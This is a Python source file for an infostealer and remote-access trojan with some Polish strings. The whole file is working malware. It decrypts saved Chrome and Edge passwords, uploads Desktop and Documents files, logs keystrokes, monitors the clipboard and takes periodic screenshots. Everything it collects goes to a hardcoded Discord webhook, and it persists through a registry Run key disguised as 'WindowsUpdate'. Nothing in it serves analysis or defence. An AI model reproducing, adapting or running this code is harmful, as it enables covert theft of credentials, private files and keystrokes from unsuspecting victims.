import os
import sys
import time
import socket
import subprocess
import threading
import json
import base64
import shutil
from datetime import datetime

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1566460646349086894/49RXr8BJinD9GaKlcwtmj3-ArcsN1qbERAI8OimqwJPmdwzwpYWZQYdit6W-IDyz-ncw"  
import requests
import pyautogui
from pynput import keyboard

def send_to_discord(content, file_data=None, filename=None):
    try:
        data = {"content": f"**[{datetime.now()}]** {content}"}
        if file_data:
            files = {"file": (filename, file_data)}
            requests.post(DISCORD_WEBHOOK, data=data, files=files)
        else:
            requests.post(DISCORD_WEBHOOK, json=data)
    except:
        pass

def get_system_info():
    info = f"""
    **Nowy victim online!**
    User: {os.getlogin()}
    Hostname: {socket.gethostname()}
    IP: {socket.gethostbyname(socket.gethostname())}
    OS: {sys.platform}
    Python: {sys.version}
    """
    send_to_discord(info)

def steal_browser_passwords():
    try:
        if os.name == 'nt':  
            import win32crypt
            import sqlite3
            paths = [
                os.path.expanduser("~\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"),
                os.path.expanduser("~\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data")
            ]
            for path in paths:
                if os.path.exists(path):
                    shutil.copy(path, "login.db")
                    conn = sqlite3.connect("login.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url, user, pwd = row
                        try:
                            pwd = win32crypt.CryptUnprotectData(pwd, None, None, None, 0)[1].decode()
                            send_to_discord(f"**Hasło Chrome/Edge**\nURL: {url}\nUser: {user}\nPass: {pwd}")
                        except:
                            pass
                    conn.close()
                    os.remove("login.db")
    except:
        pass

def steal_files():
    directories = [os.path.expanduser("~/Desktop"), os.path.expanduser("~/Documents")]
    for dir_path in directories:
        if os.path.exists(dir_path):
            for root, _, files in os.walk(dir_path):
                for file in files[:100]:  
                    try:
                        filepath = os.path.join(root, file)
                        if os.path.getsize(filepath) < 5000*1024*1024:  
                            with open(filepath, "rb") as f:
                                data = f.read()
                            send_to_discord(f"*{filepath}", data, file)
                    except:
                        pass

def keylogger():
    log = ""
    def on_press(key):
        nonlocal log
        try:
            log += str(key.char)
        except:
            log += f" [{key}] "
        if len(log) > 200:
            send_to_discord(f"**Keylog:** {log}")
            log = ""
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def clipboard_monitor():
    old_clip = ""
    while True:
        try:
            import pyperclip
            new_clip = pyperclip.paste()
            if new_clip != old_clip and new_clip.strip():
                send_to_discord(f"**Clipboard:** {new_clip}")
                old_clip = new_clip
        except:
            pass
        time.sleep(3)

def screenshot():
    while True:
        try:
            img = pyautogui.screenshot()
            img.save("screen.png")
            with open("screen.png", "rb") as f:
                send_to_discord("**Screenshot**", f.read(), "screen.png")
            os.remove("screen.png")
        except:
            pass
        time.sleep(60) 

def persist():
    if os.name == 'nt':
        import winreg
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'"{sys.executable}" "{os.path.abspath(__file__)}"')
        except:
            pass

if __name__ == "__main__":
    persist()
    get_system_info()
    steal_browser_passwords()
    steal_files()
    
    threading.Thread(target=keylogger, daemon=True).start()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=screenshot, daemon=True).start()
    
    send_to_discord("**RAT Stealer w pełni aktywny** - dane lecą non-stop")
    
    while True:
        time.sleep(100)